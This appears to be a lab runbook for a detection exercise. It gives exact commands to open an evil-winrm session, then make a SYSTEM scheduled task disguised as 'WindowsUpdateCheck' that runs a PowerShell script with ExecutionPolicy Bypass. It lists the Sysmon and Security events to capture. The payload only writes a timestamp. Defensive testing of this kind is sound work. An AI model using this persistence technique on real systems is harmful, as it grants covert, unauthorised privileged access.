# 01  Attack Execution (Exact Commands)

## Run from Kali
Establish WinRM session:
evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>

## Inside the WinRM session (PowerShell)

### Create payload
Set-Content -Path "C:\Users\Public\updater.ps1" -Value 'Add-Content -Path "C:\Users\Public\persist.txt" -Value "Executed: $(Get-Date)"'

### Create scheduled task (persistence)
schtasks /create /tn "WindowsUpdateCheck" /sc ONLOGON /ru "SYSTEM" /rl HIGHEST /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\updater.ps1" /f

### Run immediately (validation)
schtasks /run /tn "WindowsUpdateCheck"

### Optional: verify artifact + output
schtasks /query /tn "WindowsUpdateCheck" /v /fo LIST
type C:\Users\Public\persist.txt

## Evidence you must capture in EchoSentinel
- Sysmon 1: schtasks /create
- Sysmon 11: C:\Windows\System32\Tasks\WindowsUpdateCheck
- Sysmon 1: schtasks /run
- Sysmon 11: updater.ps1 created
- Security 4624 + 4672 around the same timeframe
